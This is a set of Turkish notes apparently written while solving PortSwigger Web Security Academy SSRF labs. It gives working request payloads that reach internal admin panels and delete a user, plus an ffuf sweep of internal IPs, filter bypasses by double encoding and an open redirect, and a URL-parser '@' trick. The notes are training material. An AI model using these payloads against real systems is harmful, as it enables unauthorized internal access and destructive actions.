Uzak sunucudaki cihazın istemeden başka bir sunucuya veya kendisi locali içerisindeki bir URI'a istek göndermesi sonucu oluşan açıktır.

Yani saldırgan, kurban sunucuyu bir "proxy" gibi kullanarak iç ağdaki ya da dış dünyadaki başka sistemlere erişmeye çalışır.

# LAB 1 
---

```HTTP
POST /product/stock HTTP/2
Host: 0a64008104b439dc81316b1a00540047.web-security-academy.net
Cookie: session=oU46rSBPCqyJpI7Plq0shmB8D7hz4tTD
Referer: https://0a64008104b439dc81316b1a00540047.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%
```
burada srockApi üzerinde bir SSRF var gördüldüğü üzere `http://localhost/admin` istek gönderip sonuca baktığımızda 
```html
<a href="/admin/delete?username=carlos">Delete</a>
```
endpointine istek göndererek carlos silinebilir 
```HTTP
POST /product/stock HTTP/2
Host: 0a64008104b439dc81316b1a00540047.web-security-academy.net
Cookie: session=oU46rSBPCqyJpI7Plq0shmB8D7hz4tTD

stockApi=http://localhost/admin/delete?username=carlos
```
isteğini göndererek kullanıcı silinebilir

# LAB 2 
---
FFUF payloadı ile hangi ip adresinde olduğunu bulmak için
```bash
ffuf -w asd.txt -u https://0a5400ae048e7aa5802953080014003a.web-security-academy.net/product/stock -X POST  -d "stockApi=http://192.168.0.FUZZ:8080/admin" -fc 500 
```
attığımızda yine gelen
```html
<a href="/http://192.168.0.63:8080/admin/delete?username=carlos">Delete</a>
```
yukarıdaki işlemi tekrar et 

# LAB 3
---
Burp Pro

# LAB 4 
---
stopcApi üzerinde 
`admin` `localhost` `127.0.0.1` stringleri yasaklı 
127.1/admin yasaklı
127.1/admi%6e yasaklı 
stockApi = 127.1/admi%25256e de olabilir `%25`-> `%` anlamına gelir
stockApi=http://127.1/admi%25%36%65 iki kere url encode 

# LAB 5 
---
bir stockApi alanı var yeniden 
Ancak bizden sadece endpoint almakta
Uygulamayı biraz daha incelediğimiz zaman /nextProduct endpointi karşımıza çıkıyor `path` değişkeni içerisindeki bir noktaya bizi redirect ettiriyor.
Bu `stockApi` değişkeni ile uygulamanın sadece endpoint ile istediğimiz bir pathe yönlendirmeye yarayacak

```HTTP
POST /product/stock HTTP/2
Host: 0a0200e203f4486181df7a19002200a2.web-security-academy.net
Cookie: session=4QjjXuPr9d1kTUyXOnxmK2teQN9cstNW

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
şeklinde bir payload ile admin panelini görüyoruz yine `/admin/delete?username=carlos` ile labı çözüyoruz

# LAB 7
--- 
```
http://localhost:80%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```
payload bu bu payloadı inceleyelim 

`localhost:80%2523` --> **username** gibi davranır.

`stock.weliketoshop.net` --> **gerçek host** gibi davranır

Bazı URL parser’lar `@`’ten **sonrasını host** olarak algılar, **öncesini kullanıcı adı gibi** düşünür.  
Ancak bazı SSRF filtreleri sadece **domain kısmını kontrol eder**, yani `stock.weliketoshop.net` göründüğü için bu payload geçebilir.
